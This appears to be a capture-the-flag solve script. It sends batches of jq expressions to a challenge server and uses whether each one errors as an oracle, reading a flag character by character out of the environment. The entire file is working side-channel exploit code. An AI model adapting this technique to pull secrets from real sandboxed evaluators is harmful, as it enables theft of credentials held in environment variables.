import socket
import json
import string
import time
from concurrent.futures import ThreadPoolExecutor

import solve_remote_live

RAW_CHAINS = json.loads(solve_remote_live.EMBEDDED_CHAINS_JSON)
CHAINS = {int(k): v for k, v in RAW_CHAINS.items()}

def predicate(ops):
    parts = []
    for op in ops:
        parts.append(op)
        parts.append("normals")
    return "|".join(parts)

def worker_task(sub_plan):
    """
    Executes a sub-plan over a dedicated persistent TCP socket connection with automatic reconnect.
    """
    results = []
    chunk_size = 16
    
    def get_socket():
        s = socket.create_connection(("challs.pyjail.club", 20219), timeout=15)
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        buf = b""
        while b"expr: " not in buf:
            chunk = s.recv(4096)
            if not chunk: break
            buf += chunk
        if b"expr: " in buf:
            buf = buf.split(b"expr: ", 1)[1]
        return s, buf

    s, buf = get_socket()
    token_re = solve_remote_live.TOKEN_RE

    for offset in range(0, len(sub_plan), chunk_size):
        group = sub_plan[offset : offset + chunk_size]
        exprs = [item[4] for item in group]
        payload = ("\n".join(exprs) + "\n").encode()
        
        try:
            s.sendall(payload)
            answers = []
            while len(answers) < len(exprs):
                m = list(token_re.finditer(buf))
                if m:
                    take = min(len(m), len(exprs) - len(answers))
                    answers.extend(match.group(1).decode() for match in m[:take])
                    buf = buf[m[take - 1].end():]
                    if len(answers) == len(exprs):
                        break
                    continue
                chunk = s.recv(65536)
                if not chunk:
                    raise EOFError("Socket closed")
                buf += chunk
            for item, ans in zip(group, answers):
                results.append((item, ans))
        except Exception as e:
            # Reconnect and retry group
            try: s.close()
            except Exception: pass
            s, buf = get_socket()
            s.sendall(payload)
            answers = []
            while len(answers) < len(exprs):
                m = list(token_re.finditer(buf))
                if m:
                    take = min(len(m), len(exprs) - len(answers))
                    answers.extend(match.group(1).decode() for match in m[:take])
                    buf = buf[m[take - 1].end():]
                    if len(answers) == len(exprs):
                        break
                    continue
                chunk = s.recv(65536)
                if not chunk: break
                buf += chunk
            for item, ans in zip(group, answers):
                results.append((item, ans))
    s.close()
    return results

def main():
    length = 122
    charset = string.ascii_lowercase + string.digits + "_"
    
    flag = ["?"] * length
    flag[0:5] = list("jail{")
    flag[-1] = "}"
    
    print("[*] Generating optimized candidate query plan...")
    query_plan = [] # (pos, char, is_reverse, val, expr)
    
    # We query positions 5 to 120
    for pos in range(5, length - 1):
        for c in charset:
            v = ord(c)
            # Forward add
            val_fwd = pos + v
            if val_fwd in CHAINS:
                pred = predicate(CHAINS[val_fwd])
                expr = f"env|flatten|sort|last|explode|tostream|flatten|add|{pred}|error"
                query_plan.append((pos, c, False, val_fwd, expr))
            
            # Reverse add
            val_rev = (length - 1 - pos) + v
            if val_rev in CHAINS:
                pred = predicate(CHAINS[val_rev])
                expr = f"env|flatten|sort|last|explode|reverse|implode|explode|tostream|flatten|add|{pred}|error"
                query_plan.append((pos, c, True, val_rev, expr))

    print(f"[+] Total query plan items: {len(query_plan)}")

    # Split work into 2 worker chunks (2 parallel sockets)
    mid = len(query_plan) // 2
    sub_plans = [query_plan[:mid], query_plan[mid:]]

    t0 = time.time()
    all_results = []
    
    with ThreadPoolExecutor(max_workers=2) as executor:
        futures = [executor.submit(worker_task, p) for p in sub_plans]
        for f in futures:
            all_results.extend(f.result())

    t1 = time.time()
    print(f"[+] Executed {len(all_results)} queries across 2 sockets in {t1 - t0:.2f}s!")

    # Multi-directional constraint matching
    pos_fwd = {pos: set() for pos in range(5, length - 1)}
    pos_rev = {pos: set() for pos in range(5, length - 1)}

    for (pos, c, is_rev, val, expr), ans in all_results:
        if ans == "error":
            if is_rev:
                pos_rev[pos].add(c)
            else:
                pos_fwd[pos].add(c)

    for pos in range(5, length - 1):
        f_set = pos_fwd[pos]
        r_set = pos_rev[pos]
        exact = f_set & r_set
        if len(exact) == 1:
            flag[pos] = list(exact)[0]
        elif len(f_set) == 1:
            flag[pos] = list(f_set)[0]
        elif len(r_set) == 1:
            flag[pos] = list(r_set)[0]

    final_flag = "".join(flag)
    print("\n" + "="*80)
    print(f"[+] RECOVERED FLAG: {final_flag}")
    print("="*80)
    print(f"Stats: {flag.count('?')} unknown characters out of 122")

if __name__ == "__main__":
    main()
